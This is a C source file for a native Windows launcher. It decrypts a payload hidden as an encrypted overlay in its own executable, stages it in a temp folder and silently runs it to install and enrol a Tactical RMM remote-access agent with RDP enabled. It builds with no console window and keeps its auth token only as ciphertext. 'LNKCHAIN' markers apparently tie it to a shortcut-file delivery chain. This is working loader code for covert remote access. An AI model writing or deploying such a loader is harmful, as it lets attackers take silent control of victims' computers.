/*
 * launcher.c — NATIVE Vantra launcher (Option 3), entry point.
 *
 * At runtime on a stock Windows host (no Mono/.NET needed):
 *   1. locate self → read the LOCKED VNTR overlay → AES-256-CTR decrypt
 *      envelope / config / payload strictly in memory (crypto byte-identical
 *      to template.cs and Node/OpenSSL),
 *   2. stage the decoded agent as <outDir>\_stg_<TAG>.exe,
 *   3. wait ~6s for the agent to settle, then run the STAGED payload itself
 *      with the full enrollment argv (-m install --api … --client-id …
 *      --site-id … --agent-type … --auth … --rdp --ping --power) via
 *      CreateProcess so the device registers with zero manual steps.
 *
 * NOTE: there is NO /VERYSILENT run and NO dependence on the fixed
 * C:\Program Files\TacticalAgent\tacticalrmm.exe path. The payload staged here
 * is the raw agent transport binary (not an Inno installer); running it
 * directly with the enrollment argv is what installs AND enrolls it.
 *
 * Compiled with -mwindows (PE Subsystem 2) => no console window is ever
 * attached; no PowerShell, no script host, no shell. The auth token and
 * agent payload exist only in memory at run time and only as ciphertext in
 * the artifact.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"
#include "seal.h"

static char *join_path(const char *dir, const char *name) {
    if (!dir || dir[0] == 0) return strdup(name);
    int has_sep = (dir[strlen(dir) - 1] == '\\' || dir[strlen(dir) - 1] == '/');
    int uses_slash = strchr(dir, '/') != NULL;
    char *r = (char *)malloc(strlen(dir) + strlen(name) + 2);
    if (!r) return NULL;
    sprintf(r, "%s%s%s", dir, has_sep ? "" : (uses_slash ? "/" : "\\"), name);
    return r;
}

static void write_marker(const char *dir, const char *line) {
    char *p = join_path(dir, "lnk_chain_debug.txt");
    if (p) { write_file(p, (const uint8_t *)line, strlen(line)); free(p); }
}

#ifdef SELFTEST

/* Host validation: decodes the stamped exe, writes the payload, and echoes
 * the decrypted config + parsed enroll tokens so the crypto and parser can
 * be diffed against launcher-overlay.ts / make-stamp.mjs. */
int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "usage: lztest <stamped.exe> <outPayload.bin>\n"); return 1; }
    uint8_t *buf; size_t n = 0;
    if (!read_file(argv[1], &buf, &n)) { fprintf(stderr, "SELFTEST-FAIL read %s\n", argv[1]); return 1; }
    Overlay ov;
    if (!overlay_parse(buf, n, &ov)) { fprintf(stderr, "SELFTEST-FAIL overlay\n"); free(buf); return 1; }
    if (!write_file(argv[2], ov.payload, ov.payload_len)) {
        fprintf(stderr, "SELFTEST-FAIL write %s\n", argv[2]); return 1;
    }
    printf("SELFTEST-OK tag=%s flags=%d payload=%zu bytes\n", SEAL_TAG_32, ov.flags, ov.payload_len);
    printf("CONFIG %s\n", ov.config);
    char *enroll = cfg_decoded(ov.config, "enroll", 65536);
    if (enroll && enroll[0]) {
        size_t nt = 0; char **toks = tokenize(enroll, &nt);
        printf("ENROLL-TOKENS n=%zu:", nt);
        for (size_t i = 0; i < nt; i++) printf(" [%s]", toks[i]);
        printf("\n");
        free_tokens(toks, nt);
    } else {
        printf("ENROLL <empty>\n");
    }
    free(enroll);
    free(ov.config);
    free(ov.payload);
    free(buf);
    return 0;
}

#else /* production */

static const char *locate_self(char **argv) {
    if (argv && argv[0] && argv[0][0]) {
        uint8_t *b; size_t nn = 0;
        if (read_file(argv[0], &b, &nn)) { free(b); return argv[0]; }
    }
    return "Launcher.exe";
}

int main(int argc, char **argv) {
    const char *self = locate_self(argc > 0 ? argv : NULL);
    uint8_t *buf; size_t n = 0;
    if (!read_file(self, &buf, &n)) { write_marker("", "LNKCHAIN-FAIL no-overlay"); return 0; }

    Overlay ov;
    if (!overlay_parse(buf, n, &ov)) { free(buf); write_marker("", "LNKCHAIN-FAIL decrypt"); return 0; }

    char *outDir = cfg_decoded(ov.config, "outDir", 8192);
    if (!outDir) outDir = strdup("C:\\Windows\\Temp");
    char *debug = cfg_decoded(ov.config, "debug", 16);
    char *enroll = cfg_decoded(ov.config, "enroll", 65536);

    /* stage then auto-install + auto-enroll */
    char *staged = join_path(outDir, "_stg_");
    if (staged) {
        char *full = (char *)malloc(strlen(staged) + strlen(SEAL_TAG_32) + 8);
        sprintf(full, "%s%s.exe", staged, SEAL_TAG_32);
        if (write_file(full, ov.payload, ov.payload_len)) {
            if (debug && debug[0] == '1') {
                char line[256];
                sprintf(line, "LAUNCHER-STAGE-OK tag=%s size=%zu", SEAL_TAG_32, ov.payload_len);
                write_marker(outDir, line);
            }
            /* Wait ~6s for the staged agent to settle, then run the STAGED
             * payload with the full enrollment argv directly. The staged agent
             * is the raw transport binary (not an Inno installer), so it
             * installs AND enrolls in one run — no /VERYSILENT, no fixed
             * C:\Program Files\TacticalAgent\ path. */
            sleep_ms(6000);
            run_enroll_staged(enroll, full);
        }
        free(full);
        free(staged);
    }

    free(outDir);
    free(debug);
    free(enroll);
    free(ov.config);
    free(ov.payload);
    free(buf);
    return 0;
}

#endif